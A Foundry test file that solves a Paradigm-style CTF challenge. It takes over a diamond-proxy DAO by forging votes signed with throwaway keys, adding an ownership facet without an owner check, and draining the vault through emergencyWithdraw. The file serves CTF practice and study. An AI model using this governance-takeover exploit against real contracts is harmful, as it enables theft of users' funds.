// Description:
// A forge testcase which you can use to easily debug challenges that were built using the Paradigm CTF framework.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
//Import all needed contracts here (they are usually stored in /src in your foundry directory)
import "../src/Setup.sol";
import "../src/interfaces/IDAOFacet.sol";
import "../src/interfaces/IDiamondCut.sol";
import "../src/interfaces/IERC20.sol";
import "../src/interfaces/IOwnershipFacet.sol";
import "../src/interfaces/IPigeonVaultFacet.sol";
import "../src/PigeonDiamond.sol";
import "../src/OwnershipFacetChanged.sol";


contract ParadigmTest is Test {
    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    //Initialize any additional needed variables here
    Setup public setupContract;

    function setUp() public {
	    vm.deal(deployer, 3000 ether);
        vm.startPrank(deployer);

        //Copy all code from the Setup.sol constructor() function into here
        setupContract = new Setup{value: 3000 ether}();

        vm.stopPrank();
    }

    function test() public {
        //30 eth are the standard for the paradigm framework, but this could be configured differently, you can easily check this by importing the rpc url and private key into metamask and checking the balance of the deployer account
        vm.deal(attacker, 1 ether); 
        vm.startPrank(attacker);

        //Code your solution here
        PigeonDiamond diamond = PigeonDiamond(payable(address(setupContract.pigeonDiamond())));

        //Claim our 10k token
        setupContract.claim();
       
        //We deploy our own OwnershipFacet which doesn't check who can change the owner
        OwnershipFacetChanged newOwnership = new OwnershipFacetChanged();

        //We set ourselves as the delegate for our 10k token
        IERC20(address(diamond)).delegate(address(attacker));

        //Generate our FacetCut struct with the right address & Selectors
        bytes4[] memory functionSelectors = new bytes4[](1);
        functionSelectors[0] = OwnershipFacetChanged.transferOwnershipEZ.selector;
        IDiamondCut.FacetCut memory cut = IDiamondCut.FacetCut(address(newOwnership), IDiamondCut.FacetCutAction.Add, functionSelectors);
    
        //Generate the calldata so the owner directly gets switched
        bytes memory calldataOwnerChange = abi.encodeWithSelector(OwnershipFacetChanged.transferOwnershipEZ.selector, address(attacker));

        //We submit our proposal
        uint256 proposalId = IDAOFacet(address(diamond)).submitProposal(address(newOwnership), calldataOwnerChange, cut);

        //We wait one block
        vm.roll(block.number + 1);

        //Variable for creating the signature
        uint256 privateKeyAttacker = uint256(keccak256(abi.encodePacked("attacker")));
        bytes32 hash = keccak256("\x19Ethereum Signed Message:\n32");

        //First we vote ourselves
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKeyAttacker, hash);
        bytes memory signature = abi.encodePacked(r, s, v); //v,r,s are in this order in the ecrecover
        IDAOFacet(address(diamond)).castVoteBySig(proposalId, true, signature);

        //We generate 15 private keys and sign a vote with each of them
        for (uint i = 1; i < 15; i++)
        {
            //Generate a valid signature 
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(i, hash);
            signature = abi.encodePacked(r, s, v);

            //Vote using this signature
            IDAOFacet(address(diamond)).castVoteBySig(proposalId, true, signature);
        }

        //We wait for 6 blocks to be able to execute the proposal
        vm.roll(block.number + 6);

        //We execute the proposal
        IDAOFacet(address(diamond)).executeProposal(proposalId);

        //We call the emergencyWithdraw() function
        IPigeonVaultFacet(address(diamond)).emergencyWithdraw();

        assertEq(setupContract.isSolved(), true);

        vm.stopPrank();
    }
}